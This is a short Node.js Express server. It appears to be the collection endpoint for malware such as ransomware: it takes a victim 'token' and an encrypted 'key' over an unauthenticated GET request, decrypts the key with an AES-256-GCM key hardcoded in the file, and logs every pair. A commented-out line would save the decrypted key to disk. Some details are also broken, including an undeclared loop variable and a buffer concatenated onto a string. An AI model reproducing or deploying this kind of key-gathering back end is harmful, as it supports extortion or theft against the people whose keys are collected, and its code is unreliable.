// const fs = require('fs')
const crypto = require('crypto');
const express = require('express');
const server = express();

const obj = {};
const KEY_BYTES = [190, 4, 130, 95, 129, 89, 39, 29,
                   80, 181, 156, 93, 58, 238, 87, 146,
                   117, 228, 217, 201, 26, 76, 14, 60,
                   145, 18, 113, 242, 79, 157, 132, 116];
                   

const hexToBytes = hex => {
    let bytes = [];

    for(let i = 0; i < hex.length; i += 2)
        bytes.push(parseInt(hex.substr(i, 2), 16));
    
    return bytes;
}
                   
const parseInputKey = key => key.split(' ').map(e => parseInt(e));
const parseOutputKey = key => hexToBytes(key).join(' ');

const aes256gcm = key => {
    const decrypt = enc => {
        enc = Buffer.from(enc, 'base64');
        const iv = Buffer.from(enc.subarray(enc.length - 12));
        enc = enc.subarray(0, enc.length - 12);

        const authTag = enc.subarray(enc.length - 16);
        enc = enc.subarray(0, enc.length - 16);

        const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
        decipher.setAuthTag(authTag);
        
        let str = decipher.update(enc, 'hex', 'hex');
        str += decipher.final();

        return parseOutputKey(str);
    }
    
    return {decrypt};
}

const cipher = aes256gcm(Buffer.from(KEY_BYTES));

const printKeys = keys => {
    for([t, k] of Object.entries(keys))
        console.log(`${t}: ${cipher.decrypt(parseInputKey(k))}`);
    console.log();
}

server.get('/get', (req, res) => {
    const token = req.query.token;
    const key = req.query.key;

    obj[token] = key;
    
    printKeys(obj);
    // fs.writeFileSync('key.txt', cipher.decrypt(parseInputKey(obj[token])));
    
    return res.end("ok");
});

server.listen(3000, () => {
    console.log('started server on 3000');
});
